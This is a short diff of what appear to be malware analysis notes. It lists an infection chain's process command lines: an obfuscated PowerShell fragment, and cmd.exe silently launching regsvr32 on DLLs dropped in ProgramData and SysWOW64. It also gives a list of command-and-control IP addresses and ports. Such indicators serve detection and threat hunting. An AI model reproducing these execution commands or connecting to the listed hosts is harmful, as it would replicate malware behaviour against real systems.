@@ -17,8 +17,6 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command "$ghkid=('$M
 
 C:\Windows\System32\cmd.exe" /c start /B c:\windows\syswow64\regsvr32.exe /s c:\programdata\oiphilfj.dll
 
-\??\c:\windows\syswow64\regsvr32.exe
-
 c:\windows\syswow64\regsvr32.exe  /s c:\programdata\oiphilfj.dll
 
 C:\Windows\SysWOW64\regsvr32.exe /s "C:\Windows\SysWOW64\Ntetq\kmlysgkrktii.hwz"
@@ -84,4 +82,3 @@ c2's
 103.75.201.4:443
 195.154.133.20:443
 110.232.117.186:8080
-
